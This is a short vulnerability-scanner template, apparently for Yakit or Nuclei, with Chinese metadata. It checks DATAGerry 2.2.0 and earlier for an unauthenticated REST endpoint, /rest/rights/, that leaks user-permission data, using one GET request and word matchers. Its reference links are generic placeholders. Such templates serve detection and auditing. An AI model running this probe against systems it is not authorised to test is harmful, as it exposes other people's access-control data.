script_name: DATAGerry 终端节点接口敏感信息泄露
content:
id: DATAGerry 终端节点接口敏感信息泄露

info:
  name: DATAGerry 终端节点接口敏感信息泄露
  author: Deans
  severity: middle
  description: DATAGery 2.2.0及之前版本中的接口中RESTAPI端点存在未授权访问漏洞，攻击者无需身份验证即可远程访问该端点，导致敏感信息泄露。该漏洞可能暴露用户权限配置等关键数据，进一步引发权限提升或系统完整性破坏。
  reference:
  - https://github.com/
  - https://cve.mitre.org/
  metadata:
    max-request: 1
    shodan-query: ""
    verified: true
  yakit-info:
    sign: cbe1c52d1e25521559ff988d76288b6f

http:
- raw:
  - |+
    @timeout: 30s
    GET /rest/rights/ HTTP/1.1
    Host: {{Hostname}}


  max-redirects: 3
  disable-cookie: true
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - '"results"'
    - '"level"'
    - '"name"'
    condition: and
